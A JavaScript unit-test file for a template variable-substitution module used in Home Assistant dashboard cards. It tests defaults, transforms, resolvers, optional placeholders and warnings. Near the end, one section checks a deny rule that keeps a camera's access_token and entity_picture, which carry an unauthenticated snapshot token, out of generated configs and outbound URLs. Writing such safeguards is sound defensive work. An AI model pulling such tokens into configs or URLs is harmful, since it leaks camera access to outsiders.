/*
 * Unit tests for the variable substitution in src/deep-replace.ts.
 * Run with `npm test`, which transpiles the source into .test-build first.
 */
const deepReplace = require('../.test-build/deep-replace.js').default;
const { cssSafe, fillSource } = require('../.test-build/deep-replace.js');

const { check } = require('./check');

// The substitution code warns about variables it cannot resolve, and one test is about
// that warning, so console.warn is captured for the length of the run.
const warnings = [];
const realWarn = console.warn;
console.warn = (m) => warnings.push(m);

check('plain substitution', deepReplace([{ entity: 'sun.sun' }], {}, { type: 'tile', entity: '[[entity]]' }), {
  type: 'tile',
  entity: 'sun.sun',
});

check('default values', deepReplace(undefined, { default: [{ entity: 'sun.sun' }] }, { entity: '[[entity]]' }), {
  entity: 'sun.sun',
});

check(
  'a variable name with regex metacharacters needs no escaping (idea 2)',
  deepReplace([{ 'a.b+c': 'yes' }], {}, { v: '[[a.b+c]]', w: 'x [[a.b+c|upper]] y' }),
  { v: 'yes', w: 'x YES y' },
);

check(
  'a whole value next to another placeholder is read as part of a string (idea 2)',
  deepReplace([{ a: 'one' }, { b: 'two' }], {}, { v: '[[a]][[b]]', w: '[[a]] [[b]]' }),
  { v: 'onetwo', w: 'one two' },
);

/* --------------------------------------------------- template-local variables */

check(
  'a let variable is computed from the others and used like any other',
  deepReplace(
    [{ room: 'Living Room' }],
    { let: { room_slug: '[[room|slug]]' } },
    { entity: 'light.[[room_slug]]', name: '[[room]]' },
  ),
  { entity: 'light.living_room', name: 'Living Room' },
);

check(
  'a let variable is the template internals, so a card cannot override it',
  deepReplace(
    [{ room_slug: 'hacked' }, { room: 'Hall' }],
    { let: { room_slug: '[[room|slug]]' } },
    { id: '[[room_slug]]' },
  ),
  { id: 'hall' },
);

check(
  'one let variable can build on another',
  deepReplace(
    [{ room: 'Living Room' }],
    { let: { room_slug: '[[room|slug]]', motion: 'binary_sensor.[[room_slug]]_motion' } },
    { entity: '[[motion]]' },
  ),
  { entity: 'binary_sensor.living_room_motion' },
);

check(
  'the optional marker after a transform argument is the marker, not part of the argument',
  deepReplace([{ who: 'Smith' }], {}, { name: '[[who|prefix:Mr ?]]' }),
  { name: 'Mr Smith' },
);

check(
  'and unset it still drops the key, transforms and all',
  deepReplace(undefined, {}, { name: '[[who|prefix:Mr ?]]' }),
  {},
);

check(
  'the optional marker after a transform argument is the marker, not part of the argument',
  deepReplace([{ who: 'Smith' }], {}, { name: '[[who|prefix:Mr ?]]' }),
  { name: 'Mr Smith' },
);

check(
  'and unset it still drops the key, transforms and all',
  deepReplace(undefined, {}, { name: '[[who|prefix:Mr ?]]' }),
  {},
);

/* --------------------------------------------------- template-local variables */

check(
  'a let variable is computed from the others and used like any other',
  deepReplace(
    [{ room: 'Living Room' }],
    { let: { room_slug: '[[room|slug]]' } },
    { entity: 'light.[[room_slug]]', name: '[[room]]' },
  ),
  { entity: 'light.living_room', name: 'Living Room' },
);

check(
  'a let variable is the template internals, so a card cannot override it',
  deepReplace(
    [{ room_slug: 'hacked' }, { room: 'Hall' }],
    { let: { room_slug: '[[room|slug]]' } },
    { id: '[[room_slug]]' },
  ),
  { id: 'hall' },
);

check(
  'one let variable can build on another',
  deepReplace(
    [{ room: 'Living Room' }],
    { let: { room_slug: '[[room|slug]]', motion: 'binary_sensor.[[room_slug]]_motion' } },
    { entity: '[[motion]]' },
  ),
  { entity: 'binary_sensor.living_room_motion' },
);

check(
  'passed value beats default',
  deepReplace([{ entity: 'person.john' }], { default: [{ entity: 'sun.sun' }] }, { entity: '[[entity]]' }),
  { entity: 'person.john' },
);

check(
  'passed value beats default introduced by a nested substitution',
  deepReplace([{ area: 'Shed' }], { default: [{ label: '[[area]] sun' }, { area: 'Garden' }] }, { name: '[[label]]' }),
  { name: 'Shed sun' },
);

check(
  'nested, dependency declared first',
  deepReplace(undefined, { default: [{ inner: 'sun.sun' }, { outer: '[[inner]]' }] }, { entity: '[[outer]]' }),
  { entity: 'sun.sun' },
);

check(
  'nested, dependency declared last',
  deepReplace(undefined, { default: [{ outer: '[[inner]]' }, { inner: 'sun.sun' }] }, { entity: '[[outer]]' }),
  { entity: 'sun.sun' },
);

check('nested three deep', deepReplace([{ a: '[[b]]' }, { b: '[[c]]' }, { c: 'sun.sun' }], {}, { entity: '[[a]]' }), {
  entity: 'sun.sun',
});

check(
  'nested inside a longer string',
  deepReplace([{ name: 'Sun' }, { label: 'The [[name]] card' }], {}, { title: '[[label]]!' }),
  { title: 'The Sun card!' },
);

check('number value stays a number', deepReplace([{ cols: 3 }], {}, { columns: '[[cols]]' }), { columns: 3 });

check('boolean value stays a boolean', deepReplace([{ flag: true }], {}, { on: '[[flag]]' }), { on: true });

check('object value is injected whole', deepReplace([{ obj: { a: 1 } }], {}, { thing: '[[obj]]' }), {
  thing: { a: 1 },
});

check(
  'nested object value',
  deepReplace([{ inner: 'sun.sun' }, { obj: { entity: '[[inner]]' } }], {}, { thing: '[[obj]]' }),
  { thing: { entity: 'sun.sun' } },
);

check('unknown placeholder is left alone', deepReplace([{ known: 'x' }], {}, { a: '[[known]]', b: '[[unknown]]' }), {
  a: 'x',
  b: '[[unknown]]',
});

check('no variables at all returns the content untouched', deepReplace(undefined, {}, { entity: '[[entity]]' }), {
  entity: '[[entity]]',
});

// Regressions from the upstream issue tracker. Substitution is string surgery on JSON
// text, so any value inserted into a JSON string has to be escaped for one.

check(
  'a value containing a newline (upstream #47)',
  deepReplace([{ v: 'line one\nline two' }], {}, { content: '[[v]]' }),
  { content: 'line one\nline two' },
);

check(
  'a multi-line Jinja template (upstream #60)',
  deepReplace([{ v: "{% if false -%}\n{{states('zone.home')}}\n{%- endif %}" }], {}, { content: '[[v]]' }),
  { content: "{% if false -%}\n{{states('zone.home')}}\n{%- endif %}" },
);

check('a value containing a double quote', deepReplace([{ v: 'say "hi"' }], {}, { content: '[[v]]' }), {
  content: 'say "hi"',
});

check('a value containing a backslash', deepReplace([{ v: 'C:\\Users' }], {}, { content: '[[v]]' }), {
  content: 'C:\\Users',
});

check('a value containing a tab', deepReplace([{ v: 'a\tb' }], {}, { content: '[[v]]' }), { content: 'a\tb' });

// String.replace reads $& and $1 in the replacement as patterns, which corrupted the
// value and, with substitution looping, grew it on every pass.
check('a value containing $& is inserted literally', deepReplace([{ v: 'a$&b' }], {}, { content: '[[v]]' }), {
  content: 'a$&b',
});

check('a value containing $1 is inserted literally', deepReplace([{ v: 'cost $1' }], {}, { content: '[[v]]' }), {
  content: 'cost $1',
});

check(
  'an object used inside a longer string becomes its JSON text (upstream #83)',
  deepReplace([{ VALUE: ['tst1.x', 'tst2.y'] }], {}, { content: "{{ '[[VALUE]]' }}" }),
  { content: '{{ \'["tst1.x","tst2.y"]\' }}' },
);

check('a variable name containing regexp characters', deepReplace([{ 'my.var': 'x' }], {}, { content: '[[my.var]]' }), {
  content: 'x',
});

check('null value', deepReplace([{ v: null }], {}, { content: '[[v]]' }), { content: null });

// The examples from the two nested-variable issues, verbatim.

check(
  'default referencing another variable (upstream #62)',
  deepReplace([{ room: 'office' }], { default: [{ light_entity: 'light.[[room]]' }] }, { entity: '[[light_entity]]' }),
  { entity: 'light.office' },
);

check(
  'default referencing another variable, overridden (upstream #62)',
  deepReplace(
    [{ room: 'office' }, { light_entity: 'light.office_floor_lamp' }],
    { default: [{ light_entity: 'light.[[room]]' }] },
    { entity: '[[light_entity]]' },
  ),
  { entity: 'light.office_floor_lamp' },
);

check(
  'a variable falling back to another variable (upstream #84)',
  deepReplace(
    [{ entity: 'sensor.my_entity' }],
    { default: [{ history_entity: '[[entity]]' }] },
    { entity: '[[entity]]', history: '[[history_entity]]' },
  ),
  { entity: 'sensor.my_entity', history: 'sensor.my_entity' },
);

check(
  'a declared default is substituted',
  deepReplace(undefined, { variables: [{ name: 'entity', default: 'sun.sun' }] }, { entity: '[[entity]]' }),
  { entity: 'sun.sun' },
);

check(
  'a passed value beats a declared default',
  deepReplace(
    [{ entity: 'sun.moon' }],
    { variables: [{ name: 'entity', default: 'sun.sun' }] },
    {
      entity: '[[entity]]',
    },
  ),
  { entity: 'sun.moon' },
);

check(
  'a declared default beats the older default list',
  deepReplace(
    undefined,
    { variables: [{ name: 'entity', default: 'sun.sun' }], default: [{ entity: 'sun.moon' }] },
    { entity: '[[entity]]' },
  ),
  { entity: 'sun.sun' },
);

check(
  'slug turns a name into an entity id fragment',
  deepReplace([{ room: 'Living Room' }], {}, { entity: 'light.[[room|slug]]' }),
  { entity: 'light.living_room' },
);

check('upper and lower change case', deepReplace([{ a: 'MiXeD' }], {}, { u: '[[a|upper]]', l: '[[a|lower]]' }), {
  u: 'MIXED',
  l: 'mixed',
});

check('title capitalises each word', deepReplace([{ a: 'living room light' }], {}, { t: '[[a|title]]' }), {
  t: 'Living Room Light',
});

check('a transform on a whole value produces a string', deepReplace([{ a: 'Hall' }], {}, { name: '[[a|upper]]' }), {
  name: 'HALL',
});

check(
  'the same variable can be used raw and transformed at once',
  deepReplace([{ room: 'Back Garden' }], {}, { name: '[[room]]', entity: 'light.[[room|slug]]' }),
  { name: 'Back Garden', entity: 'light.back_garden' },
);

check(
  'an unknown transform is not a transform, so nothing is replaced',
  deepReplace([{ a: 'x' }], {}, { v: '[[a|shout]]' }),
  { v: '[[a|shout]]' },
);

check(
  'slug collapses runs of punctuation and trims the ends',
  deepReplace([{ a: "  John's  Shed!  " }], {}, { v: '[[a|slug]]' }),
  { v: 'john_s_shed' },
);

check(
  'a transform applies to a default as well as a passed value',
  deepReplace(undefined, { default: [{ room: 'Front Door' }] }, { v: '[[room|slug]]' }),
  { v: 'front_door' },
);

warnings.length = 0;
const started = Date.now();
deepReplace([{ a: 'x[[a]]' }], {}, { v: '[[a]]' });
const elapsed = Date.now() - started;
check('a self-referencing variable terminates', elapsed < 2000, true);
check('a self-referencing variable warns', warnings.length > 0, true);

/* ------------------------------------------- warning about a transformed mapping */

warnings.length = 0;
deepReplace([{ tap: { action: 'toggle' } }], {}, { a: '[[tap|lower]]' });
check('a transform on a mapping says something rather than nothing', warnings.length, 1);

check(
  'the warning names the placeholder, what the value is, and what to do',
  /\[\[tap\|lower\]\]/.test(warnings[0]) && /mapping/.test(warnings[0]) && /scalar/.test(warnings[0]),
  true,
);

warnings.length = 0;
deepReplace([{ items: [1, 2] }], {}, { a: '[[items|upper]]' });
check('a list is described as a list', /list/.test(warnings[0]), true);

warnings.length = 0;
deepReplace([{ tap: { action: 'toggle' } }], {}, { a: '[[tap|lower]]', b: 'x [[tap|lower]] y', c: '[[tap|lower]]' });
check('the same mistake in several places is said once', warnings.length, 1);

warnings.length = 0;
deepReplace([{ tap: { action: 'toggle' } }], {}, { a: '[[tap|lower]]', b: '[[tap|upper]]' });
check('two different transforms on it are both named', warnings.length, 1);
check('and both appear in the one warning', /tap\|lower/.test(warnings[0]) && /tap\|upper/.test(warnings[0]), true);

warnings.length = 0;
deepReplace([{ tap: { action: 'toggle' } }], {}, { a: '[[tap]]' });
check('using a mapping without a transform is fine, and silent', warnings.length, 0);

warnings.length = 0;
deepReplace([{ room: 'Hall' }], {}, { a: '[[room|slug]]' });
check('a transform that works says nothing', warnings.length, 0);

warnings.length = 0;
deepReplace([{ nothing: null }], {}, { a: '[[nothing|upper]]' });
check('null is a scalar, so it transforms and stays silent', warnings.length, 0);

console.warn = realWarn;

check(
  'a transform on a mapping or list is left unsubstituted, as a visible mistake',
  deepReplace([{ tap: { action: 'toggle' } }], {}, { a: 'x [[tap]]', b: 'x [[tap|lower]]', c: '[[tap|lower]]' }),
  { a: 'x {"action":"toggle"}', b: 'x [[tap|lower]]', c: '[[tap|lower]]' },
);

check('a transform on a number still works, it is a scalar', deepReplace([{ n: 42 }], {}, { a: 'x [[n|upper]]' }), {
  a: 'x 42',
});

check('transforms chain, left to right', deepReplace([{ room: 'Living Room' }], {}, { a: '[[room|slug|upper]]' }), {
  a: 'LIVING_ROOM',
});

check('kebab spells a slug with dashes', deepReplace([{ room: 'Living Room' }], {}, { a: 'x-[[room|kebab]]' }), {
  a: 'x-living-room',
});

check(
  'an unknown transform anywhere in a chain leaves the placeholder visible',
  deepReplace([{ room: 'Hall' }], {}, { a: '[[room|slug|shout]]' }),
  { a: '[[room|slug|shout]]' },
);

check(
  'an escaped placeholder is written out literally, even when the variable exists',
  deepReplace([{ room: 'Hall' }], {}, { a: '[[!room]]', b: '[[room]]' }),
  { a: '[[room]]', b: 'Hall' },
);

check('an escape works when there are no variables at all', deepReplace(undefined, {}, { a: '[[!room]]' }), {
  a: '[[room]]',
});

check('an escape keeps a transform suffix intact', deepReplace([{ room: 'Hall' }], {}, { a: '[[!room|slug]]' }), {
  a: '[[room|slug]]',
});

check(
  'an escape inside a variable value survives to the end',
  deepReplace([{ room: 'Hall' }, { note: 'write [[!room]] for the name' }], {}, { a: '[[note]]' }),
  { a: 'write [[room]] for the name' },
);

// console.warn was handed back above; take it again for the warnings below.
console.warn = (m) => warnings.push(m);

// A variable nobody set renders as the literal [[name]]. The editors say so while you are
// editing; these are about the running card saying it too.

warnings.length = 0;
check(
  'a variable with no value at all still renders as written',
  deepReplace(undefined, {}, { type: 'tile', name: '[[name]]' }),
  { type: 'tile', name: '[[name]]' },
);
check('and warns about it', warnings.length, 1);
check('naming the variable', /\[\[name\]\]/.test(warnings[0]), true);

warnings.length = 0;
deepReplace(undefined, {}, { name: '[[name]]' }, 'room_tile');
check('the warning names the template when it is known', /room_tile/.test(warnings[0]), true);

warnings.length = 0;
deepReplace([{ other: 1 }], {}, { name: '[[name]]' });
check('an unset variable warns even when other variables resolved', warnings.length, 1);

warnings.length = 0;
check('several unset variables are said once', deepReplace(undefined, {}, { a: '[[one]]', b: '[[two]]' }), {
  a: '[[one]]',
  b: '[[two]]',
});
check('in a single warning', warnings.length, 1);
check('naming both', /\[\[one\]\]/.test(warnings[0]) && /\[\[two\]\]/.test(warnings[0]), true);

warnings.length = 0;
deepReplace([{ room: 'Hall' }], {}, { a: '[[room]]' });
check('a variable that resolves says nothing', warnings.length, 0);

warnings.length = 0;
deepReplace(undefined, {}, { a: '[[!room]]' });
check('an escaped placeholder is not an unset variable', warnings.length, 0);

warnings.length = 0;
deepReplace([{ room: 'Hall' }], {}, { a: '[[!room]]', b: '[[room]]' });
check('nor is one sitting beside a real variable', warnings.length, 0);

warnings.length = 0;
deepReplace([{ tap: { action: 'toggle' } }], {}, { a: '[[tap|lower]]' });
check('a refused transform warns once, not twice', warnings.length, 1);
check('and it is the transform message, not this one', /transform/.test(warnings[0]), true);

warnings.length = 0;
check(
  'json later in the chain is left as written',
  deepReplace([{ o: { foo: 'bar' } }], {}, { a: '[[o|json|replace:foo:item2|json]]' }),
  { a: '[[o|json|replace:foo:item2|json]]' },
);
check('and says json has to come first', /json/.test(warnings[0]) && /first/.test(warnings[0]), true);
check('not that Home Assistant had nothing', /Home Assistant/.test(warnings[0]), false);

warnings.length = 0;
deepReplace([{ name: 'Hall' }], {}, { a: '[[name|upper|json]]' });
check('a scalar with json after a transform says the same', /first/.test(warnings[0]), true);

warnings.length = 0;
deepReplace([{ room: 'Hall' }], {}, { a: '[[room]]', b: '[[missing]]' });
check('an unset variable is still caught alongside one that resolved', warnings.length, 1);
check('naming only the unset one', /\[\[missing\]\]/.test(warnings[0]) && !/\[\[room\]\]/.test(warnings[0]), true);

// Placeholders that ask Home Assistant for a value, through the whole substitution rather
// than a transform on its own.
const hass = {
  states: { 'light.hall': { attributes: { friendly_name: 'Hall Lamp', brightness: 128 } } },
  entities: { 'light.hall': { area_id: 'hall', device_id: 'dev1' } },
  devices: { dev1: { name: 'Lamp Module' } },
  areas: { hall: { name: 'Hallway' } },
};

console.warn = (m) => warnings.push(m);

warnings.length = 0;
check(
  'a name can default to the entity it is given',
  deepReplace(
    [{ entity: 'light.hall' }],
    {},
    { type: 'tile', entity: '[[entity]]', name: '[[entity|friendly_name]]' },
    undefined,
    hass,
  ),
  { type: 'tile', entity: 'light.hall', name: 'Hall Lamp' },
);
check('and says nothing while doing it', warnings.length, 0);

check(
  'the area comes through too',
  deepReplace([{ entity: 'light.hall' }], {}, { a: '[[entity|area]]', b: '[[entity|device]]' }, undefined, hass),
  { a: 'Hallway', b: 'Lamp Module' },
);

check(
  'an attribute comes back as a number when it is one',
  deepReplace([{ entity: 'light.hall' }], {}, { a: '[[entity|attr:brightness]]' }, undefined, hass),
  { a: '128' },
);

check(
  'a resolver works inside a longer string',
  deepReplace([{ entity: 'light.hall' }], {}, { a: 'The [[entity|friendly_name]] is on' }, undefined, hass),
  { a: 'The Hall Lamp is on' },
);

check(
  'a resolver and a transform chain together',
  deepReplace([{ entity: 'light.hall' }], {}, { a: '[[entity|area|slug]]' }, undefined, hass),
  { a: 'hallway' },
);

warnings.length = 0;
check(
  'an entity Home Assistant does not have leaves the placeholder alone',
  deepReplace([{ entity: 'light.nope' }], {}, { a: '[[entity|friendly_name]]' }, undefined, hass),
  { a: '[[entity|friendly_name]]' },
);
check('and warns about it', warnings.length, 1);
check('saying it asked Home Assistant', /Home Assistant/.test(warnings[0]), true);

warnings.length = 0;
check(
  'without hass the placeholder is left as written',
  deepReplace([{ entity: 'light.hall' }], {}, { a: '[[entity|friendly_name]]' }),
  { a: '[[entity|friendly_name]]' },
);
check('and warns once', warnings.length, 1);

warnings.length = 0;
check(
  'an escaped resolver is still just text',
  deepReplace([{ entity: 'light.hall' }], {}, { a: '[[!entity|friendly_name]]' }, undefined, hass),
  { a: '[[entity|friendly_name]]' },
);
check('and is silent', warnings.length, 0);

check(
  'a resolver reads a default the same as a passed value',
  deepReplace(undefined, { default: [{ entity: 'light.hall' }] }, { a: '[[entity|friendly_name]]' }, undefined, hass),
  { a: 'Hall Lamp' },
);

warnings.length = 0;
check(
  'an unknown word after the bar is still not a resolver',
  deepReplace([{ entity: 'light.hall' }], {}, { a: '[[entity|friendly_nam]]' }, undefined, hass),
  { a: '[[entity|friendly_nam]]' },
);

warnings.length = 0;
check(
  'asked quietly, it still resolves what it can',
  deepReplace(
    [{ entity: 'light.hall' }],
    {},
    { a: '[[entity|friendly_name]]', b: '[[missing]]' },
    undefined,
    hass,
    true,
  ),
  { a: 'Hall Lamp', b: '[[missing]]' },
);
check('and says nothing at all', warnings.length, 0);

warnings.length = 0;
deepReplace([{ obj: { a: 1 } }], {}, { a: '[[obj|upper]]' }, undefined, undefined, true);
check('quiet covers a refused transform too', warnings.length, 0);

// [[name?]] - a placeholder the template can do without.

warnings.length = 0;
check(
  'an option nothing gives a value to is taken out altogether',
  deepReplace(undefined, {}, { type: 'tile', entity: 'light.hall', name: '[[name?]]' }),
  { type: 'tile', entity: 'light.hall' },
);
check('and it is not a mistake worth warning about', warnings.length, 0);

check(
  'a value given for it is used as normal',
  deepReplace([{ name: 'Hall' }], {}, { type: 'tile', name: '[[name?]]' }),
  { type: 'tile', name: 'Hall' },
);

check(
  'an empty string counts as nothing to say',
  deepReplace([{ name: '' }], {}, { type: 'tile', name: '[[name?]]' }),
  { type: 'tile' },
);
check('and so does null', deepReplace([{ name: null }], {}, { type: 'tile', name: '[[name?]]' }), { type: 'tile' });

check('but a zero is a value', deepReplace([{ n: 0 }], {}, { a: '[[n?]]' }), { a: 0 });
check('and so is false', deepReplace([{ n: false }], {}, { a: '[[n?]]' }), { a: false });

check(
  'a default fills an option the same as anything else',
  deepReplace(undefined, { default: [{ name: 'Hall' }] }, { a: '[[name?]]' }),
  { a: 'Hall' },
);

check('inside a longer string it just leaves quietly', deepReplace(undefined, {}, { a: 'Hall[[suffix?]]' }), {
  a: 'Hall',
});

check(
  'a dropped item leaves no hole in a list',
  deepReplace([{ b: 'two' }], {}, { cards: ['[[a?]]', '[[b?]]', '[[c?]]'] }),
  { cards: ['two'] },
);

check(
  'it works alongside a transform',
  deepReplace([{ room: 'Back Garden' }], {}, { a: '[[room|slug?]]', b: '[[missing|slug?]]' }),
  { a: 'back_garden' },
);

check(
  'and nested inside a stack',
  deepReplace(
    [{ name: 'Hall' }],
    {},
    { type: 'vertical-stack', cards: [{ type: 'tile', name: '[[name?]]', icon: '[[icon?]]' }] },
  ),
  { type: 'vertical-stack', cards: [{ type: 'tile', name: 'Hall' }] },
);

check('an escaped one is still just brackets', deepReplace(undefined, {}, { a: '[[!name?]]' }), { a: '[[name?]]' });

// A block left empty by its options goes too (discussion #141).
const featured = { type: 'tile', entity: 'light.hall', features: [{ type: '[[light_type?]]' }] };
check('a block that only held an option goes with it, all the way up', deepReplace(undefined, {}, featured), {
  type: 'tile',
  entity: 'light.hall',
});
check('and is there as written when the option has a value', deepReplace([{ light_type: 'toggle' }], {}, featured), {
  type: 'tile',
  entity: 'light.hall',
  features: [{ type: 'toggle' }],
});
check(
  'a block with something else in it stays, less the option',
  deepReplace(undefined, {}, { features: [{ type: 'light-brightness', style: '[[style?]]' }] }),
  { features: [{ type: 'light-brightness' }] },
);
check(
  'a mapping emptied by its options goes too',
  deepReplace(undefined, {}, { type: 'tile', card_mod: { style: '[[style?]]', class: '[[cls?]]' } }),
  { type: 'tile' },
);
check(
  'only the emptied items leave a list, the rest stay in order',
  deepReplace([{ b: 'two' }], {}, { features: [{ type: '[[a?]]' }, { type: '[[b?]]' }, { type: 'fixed' }] }),
  { features: [{ type: 'two' }, { type: 'fixed' }] },
);
check(
  'a block written empty is left alone',
  deepReplace(undefined, {}, { features: [], tap_action: {}, name: '[[name?]]' }),
  { features: [], tap_action: {} },
);
check('an escaped option keeps its block', deepReplace(undefined, {}, { features: [{ type: '[[!name?]]' }] }), {
  features: [{ type: '[[name?]]' }],
});
check(
  'text left empty inside a longer string is still a value, so its block stays',
  deepReplace(undefined, {}, { tap_action: { navigation_path: '/[[path?]]' } }),
  { tap_action: { navigation_path: '/' } },
);
check(
  'the card itself is never taken away, however little is left',
  deepReplace(undefined, {}, { name: '[[name?]]' }),
  {},
);

warnings.length = 0;
check(
  'a required-looking plain placeholder still warns beside an optional one',
  deepReplace(undefined, {}, { a: '[[gone]]', b: '[[fine?]]' }),
  { a: '[[gone]]' },
);
check('naming only the plain one', /\[\[gone\]\]/.test(warnings[0]) && !/fine/.test(warnings[0]), true);

console.warn = realWarn;

/* ------------------------------------------------- default: and or: stand-ins */

const HOUSE = {
  entities: {
    'light.kitchen': { entity_id: 'light.kitchen', area_id: 'kitchen', device_id: 'dev1' },
    'light.loose': { entity_id: 'light.loose' },
  },
  devices: { dev1: { id: 'dev1', area_id: 'kitchen', name_by_user: 'Ceiling unit' } },
  areas: { kitchen: { area_id: 'kitchen', name: 'Kitchen', floor_id: 'ground' } },
  floors: { ground: { floor_id: 'ground', name: 'Ground floor' } },
  states: { 'light.kitchen': { attributes: { friendly_name: 'Kitchen light' } } },
};

check(
  'a variable nothing sets falls back to the text given',
  deepReplace(undefined, {}, { a: '[[room|default:Somewhere]]' }),
  {
    a: 'Somewhere',
  },
);

check(
  'a variable that is set ignores the stand-in',
  deepReplace([{ room: 'Hall' }], {}, { a: '[[room|default:Somewhere]]' }),
  { a: 'Hall' },
);

check(
  'an empty string counts as nothing to show',
  deepReplace([{ room: '' }], {}, { a: '[[room|default:Somewhere]]' }),
  { a: 'Somewhere' },
);

check('a stand-in can contain spaces', deepReplace(undefined, {}, { a: '[[room|default:Living Room]]' }), {
  a: 'Living Room',
});

check(
  'transforms after a stand-in apply to it',
  deepReplace(undefined, {}, { a: '[[room|default:Living Room|slug]]' }),
  { a: 'living_room' },
);

check(
  'a stand-in inside a longer string lands in the right place',
  deepReplace(undefined, {}, { a: 'The [[room|default:hall]] light' }),
  { a: 'The hall light' },
);

check('or: falls back to another variable', deepReplace([{ fallback: 'Hall' }], {}, { a: '[[name|or:fallback]]' }), {
  a: 'Hall',
});

check(
  'or: leaves the first value alone when it has one',
  deepReplace([{ name: 'Kitchen' }, { fallback: 'Hall' }], {}, { a: '[[name|or:fallback]]' }),
  { a: 'Kitchen' },
);

check(
  'or: and default: chain, so the last word is always something',
  deepReplace(undefined, {}, { a: '[[name|or:fallback|default:Nothing]]' }),
  { a: 'Nothing' },
);

check(
  'a variable used only through or: is not reported as unused',
  deepReplace([{ fallback: 'Hall' }], {}, { a: '[[name|or:fallback]]' }),
  { a: 'Hall' },
);

check(
  'an empty default: with ? is still a gap, so the key goes',
  deepReplace([{ name: null }], {}, { a: '[[name|default:?]]', b: 'x' }),
  { b: 'x' },
);

check(
  'an empty default: with ? goes for a variable nothing sets too',
  deepReplace(undefined, {}, { a: '[[name|default:?]]', b: 'Hi [[name|default:?]]!' }),
  { b: 'Hi !' },
);

check(
  'an empty default: without ? still gives the empty text',
  deepReplace([{ name: null }], {}, { a: '[[name|default:]]' }),
  { a: '' },
);

console.warn = (m) => warnings.push(m);
warnings.length = 0;
deepReplace([{ name: '' }, { other: null }], {}, { a: '[[name|or:other]]' }, 't');
console.warn = realWarn;
check(
  'an or: that finds nothing is reported as unset, not blamed on Home Assistant',
  warnings.length === 1 && /\[\[name\|or:other\]\]/.test(warnings[0]) && !/Home Assistant/.test(warnings[0]),
  true,
);

check(
  'a stand-in rescues a resolver that found nothing',
  deepReplace([{ e: 'light.loose' }], {}, { a: '[[e|area|default:Unassigned]]' }, undefined, HOUSE),
  { a: 'Unassigned' },
);

/* ----------------------------------------------------------------- new resolvers */

check(
  'floor reaches the floor through the area',
  deepReplace([{ e: 'light.kitchen' }], {}, { a: '[[e|floor]]' }, undefined, HOUSE),
  { a: 'Ground floor' },
);

check(
  'area_id gives the id, for building another entity id from',
  deepReplace([{ e: 'light.kitchen' }], {}, { a: 'binary_sensor.[[e|area_id]]_motion' }, undefined, HOUSE),
  { a: 'binary_sensor.kitchen_motion' },
);

check(
  'device_id gives the device the entity belongs to',
  deepReplace([{ e: 'light.kitchen' }], {}, { a: '[[e|device_id]]' }, undefined, HOUSE),
  { a: 'dev1' },
);

check(
  'area_id is not half-read as area',
  deepReplace([{ e: 'light.kitchen' }], {}, { a: '[[e|area]]/[[e|area_id]]' }, undefined, HOUSE),
  { a: 'Kitchen/kitchen' },
);

/* ------------------------------------------------------------------- json on purpose */

check(
  'json puts a mapping in as its JSON text',
  deepReplace([{ tap: { action: 'toggle' } }], {}, { a: 'Tap does [[tap|json]]' }),
  { a: 'Tap does {"action":"toggle"}' },
);

check('json works on a list too', deepReplace([{ items: [1, 2] }], {}, { a: '[[items|json]]' }), { a: '[1,2]' });

check(
  'a mapping without json is still refused, as before',
  deepReplace([{ tap: { action: 'toggle' } }], {}, { a: '[[tap|upper]]' }),
  { a: '[[tap|upper]]' },
);

/* --------------------------------------------------- secrets stay out of the config */

// A camera's access_token grants an unauthenticated snapshot, so a template must not be able
// to resolve it into a config it then puts in an outbound url. The placeholder is left as it
// was written, exactly as an attribute the entity does not carry would be.
const secretHass = {
  states: { 'camera.front': { attributes: { access_token: 'sk-secret-123', brightness: 5 } } },
};
check(
  'a camera access_token cannot be pulled into a config',
  deepReplace([{ cam: 'camera.front' }], {}, { url: '[[cam|attr:access_token]]' }, undefined, secretHass),
  { url: '[[cam|attr:access_token]]' },
);
check(
  'entity_picture, which carries the same token, is blocked too',
  deepReplace([{ cam: 'camera.front' }], {}, { url: '[[cam|attr:entity_picture]]' }, undefined, secretHass),
  { url: '[[cam|attr:entity_picture]]' },
);
check(
  'an ordinary attribute still resolves',
  deepReplace([{ cam: 'camera.front' }], {}, { b: '[[cam|attr:brightness]]' }, undefined, secretHass),
  { b: '5' },
);

/* --------------------------------------------------- bool (discussion #142) */

const menu = { enabled: '[[menu_link|bool]]', title: 'Link shown: [[menu_link|bool]]' };
check(
  'bool switches a whole value on with a real true when the link is passed',
  deepReplace([{ menu_link: '/x' }], {}, menu),
  {
    enabled: true,
    title: 'Link shown: true',
  },
);
check(
  'bool switches a whole value off with a real false when the link is empty',
  deepReplace([{ menu_link: '' }], {}, menu),
  {
    enabled: false,
    title: 'Link shown: false',
  },
);
warnings.length = 0;
check('bool switches off when the link is never passed at all', deepReplace([], {}, menu), {
  enabled: false,
  title: 'Link shown: false',
});
check('bool on a variable nobody set is an answer, not an unresolved placeholder', warnings, []);
check(
  'bool switches off when there are no variables of any kind',
  deepReplace(undefined, {}, { enabled: '[[menu_link|bool]]' }),
  { enabled: false },
);
check('bool passes a real boolean through', deepReplace([{ on: false }], {}, { enabled: '[[on|bool]]' }), {
  enabled: false,
});
check('bool reads the word false as no', deepReplace([{ on: 'false' }], {}, { enabled: '[[on|bool]]' }), {
  enabled: false,
});
check('bool reads an empty list as no', deepReplace([{ items: [] }], {}, { enabled: '[[items|bool]]' }), {
  enabled: false,
});
check(
  'bool reads a mapping with something in it as yes',
  deepReplace([{ tap: { action: 'more-info' } }], {}, { enabled: '[[tap|bool]]' }),
  {
    enabled: true,
  },
);
check(
  'a chain that carries on after bool gives text, not a boolean',
  deepReplace([{ menu_link: '/x' }], {}, { state: '[[menu_link|bool|map:true=on,false=off]]' }),
  { state: 'on' },
);
check(
  'bool through a let variable reaches the card as a real boolean',
  deepReplace([{ menu_link: '/x' }], { let: { link_enable: '[[menu_link|bool]]' } }, { enabled: '[[link_enable]]' }),
  { enabled: true },
);
check(
  'bool through a let variable switches off when the link is never passed',
  deepReplace([], { let: { link_enable: '[[menu_link|bool]]' } }, { enabled: '[[link_enable]]' }),
  { enabled: false },
);
check(
  'the example from discussion #142 renders as asked',
  deepReplace(
    [{ camera_entity: 'camera.door' }],
    {},
    {
      type: 'custom:advanced-camera-card',
      elements: [
        {
          type: 'custom:advanced-camera-card-menu-icon',
          enabled: '[[menu_link|bool]]',
          tap_action: { action: 'navigate', url: '[[menu_link?]]' },
        },
      ],
    },
  ),
  {
    type: 'custom:advanced-camera-card',
    elements: [{ type: 'custom:advanced-camera-card-menu-icon', enabled: false, tap_action: { action: 'navigate' } }],
  },
);

/* --------------------------------------------------- if (discussion #150) */

